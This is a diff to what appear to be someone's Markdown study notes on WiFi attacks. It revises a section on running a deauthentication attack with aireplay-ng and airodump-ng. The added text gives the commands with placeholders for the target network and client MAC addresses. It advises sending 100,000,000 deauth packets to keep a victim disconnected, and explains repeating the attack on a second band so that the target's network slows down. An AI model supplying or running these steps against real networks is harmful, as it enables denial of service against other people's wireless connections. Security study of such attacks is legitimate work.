@@ -11,17 +11,19 @@
     3. This will allow us to successfully disconnect or deauthenticate any client from any network.
 ![Precedure](./pic/2_4_1.jpg)
 
-3. Using aireplay-ng
-    1. Command
+3. Using aireplay-ng in practice
     ```
-    aireplay-ng --deauth 100000000 -a [MAC Address of the target network] -c [MAC Address of the target client] -D [interface name]
+    # 1. Firstly, when we want to make it successful, we need to split the terminal window and run the packet sniffing and deauth at the same time.
+    
+    airodump-ng --bssid [BSSID] --channel [Channel] [interface name]
+
+    # 2. Using the aireplay-ng
+
+    aireplay-ng --deauth 100000000 -a [MAC Address of the target network] -c [MAC Address of the target client] (-D) [interface name]
     # 100000000 is number of deauthentication packets that I want to send. It's always very large so can keep sending it to both the router and the target device to disconnect it for a long time.
     # Add -D is the target is 5Ghz
-    ```
-    2. Sometimes the client will automatically connect to a new network, which we just need to do this again
-    3. Always, when we want to make it successful, we need to split the terminal window and run the packet sniffing and deauth at the same time.
-    ```
-    airodump-ng --bssid [BSSID] --channel [Channel] [interface name]
+
+    # 3. If this still doesn't work meaning the target is using both 2.4Ghz and 5Ghz, which we need to repeat the above procedure again in another frequency(Mostly when attacking the PC). Although it might still can't disconnect in the display but the network of the target will be extremely slow. And we need to buy a better wireless adapter.
     ```
     ![Result](./pic/2_4_2.png)
 
